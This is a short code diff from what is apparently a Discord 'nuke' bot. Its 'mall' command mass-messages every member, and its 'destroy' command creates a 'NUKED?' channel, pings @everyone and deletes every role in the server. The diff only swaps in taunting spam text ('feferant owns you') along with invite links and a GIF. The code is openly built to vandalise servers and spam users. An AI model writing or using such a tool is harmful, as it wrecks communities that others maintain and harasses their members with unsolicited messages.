@@ -92,7 +92,7 @@ async def mall(ctx):
     for member in list(client.get_all_members()):
         await asyncio.sleep(0)
         try:
-            await member.send("")
+            await member.send("https://cdn.discordapp.com/attachments/838382651282423828/843584066103541770/1620607087338.gif FEFERANT LOVES YOU https://discord.gg/RSBzPMqAPN")
         except:
             pass
         print("Action completed: Message all")
@@ -110,7 +110,7 @@ async def destroy(ctx):
             pass
         guild = ctx.message.guild
         channel = await guild.create_text_channel("NUKED?")
-        await channel.send("@everyone https://discord.gg/rR5zYMd8A8")
+        await channel.send("@everyone feferant owns you TIGER https://discord.gg/rR5zYMd8A8 https://cdn.discordapp.com/attachments/838382651282423828/843584066103541770/1620607087338.gif")
     for role in list(ctx.guild.roles):
         try:
             await role.delete()
